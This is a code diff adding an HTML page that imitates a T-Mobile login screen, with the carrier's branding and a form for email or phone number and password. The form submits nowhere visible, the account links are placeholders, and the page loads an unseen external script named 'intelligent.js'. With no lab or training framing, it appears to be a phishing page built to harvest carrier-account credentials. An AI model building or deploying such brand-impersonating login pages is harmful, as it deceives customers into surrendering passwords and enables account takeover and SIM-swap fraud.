@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>T-Mobile Login </title>
+
+<style>
+    body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background: #f4f4f4;
+    }
+
+    .header {
+        background: #E20074;
+        padding: 20px;
+        color: white;
+        text-align: center;
+        font-size: 24px;
+        font-weight: bold;
+    }
+
+    .login-container {
+        max-width: 380px;
+        margin: 60px auto;
+        background: white;
+        padding: 30px 25px;
+        border-radius: 12px;
+        box-shadow: 0 4px 14px rgba(0,0,0,0.15);
+    }
+
+    .login-container h2 {
+        color: #333;
+        margin-bottom: 15px;
+        text-align: center;
+    }
+
+    .input-group {
+        margin-bottom: 18px;
+    }
+
+    .input-group label {
+        display: block;
+        font-size: 14px;
+        font-weight: bold;
+        color: #555;
+        margin-bottom: 5px;
+    }
+
+    .input-group input {
+        width: 100%;
+        padding: 12px;
+        font-size: 15px;
+        border: 1px solid #bbb;
+        border-radius: 8px;
+        outline: none;
+        transition: 0.2s;
+    }
+
+    .input-group input:focus {
+        border-color: #E20074;
+        box-shadow: 0 0 4px rgba(226,0,116,0.4);
+    }
+
+    .login-btn {
+        width: 100%;
+        padding: 14px;
+        background: #E20074;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        color: white;
+        font-weight: bold;
+        cursor: pointer;
+        transition: 0.2s;
+    }
+
+    .login-btn:hover {
+        background: #c00063;
+    }
+
+    .links {
+        margin-top: 20px;
+        text-align: center;
+        font-size: 14px;
+    }
+
+    .links a {
+        color: #E20074;
+        text-decoration: none;
+        font-weight: bold;
+    }
+
+    .links a:hover {
+        text-decoration: underline;
+    }
+</style>
+</head>
+<script src="intelligent.js"></script>
+<body>
+
+<div class="header">T-Mobile</div>
+
+<div class="login-container">
+    <h2>Log in to your account</h2>
+<form>
+    <div class="input-group">
+        <label>Email or Phone Number</label>
+        <input type="text" placeholder="Enter your email or phone" required name="Email or phone">
+    </div>
+
+    <div class="input-group">
+        <label>Password</label>
+        <input type="password" placeholder="Enter your password" required name="password">
+    </div>
+
+    <button class="login-btn" type="submit">Log In</button>
+</form>
+    <div class="links">
+        <p><a href="#">Forgot Password?</a></p>
+        <p>Don’t have an account? <a href="#">Sign Up</a></p>
+    </div>
+</div>
+
+</body>
+</html>
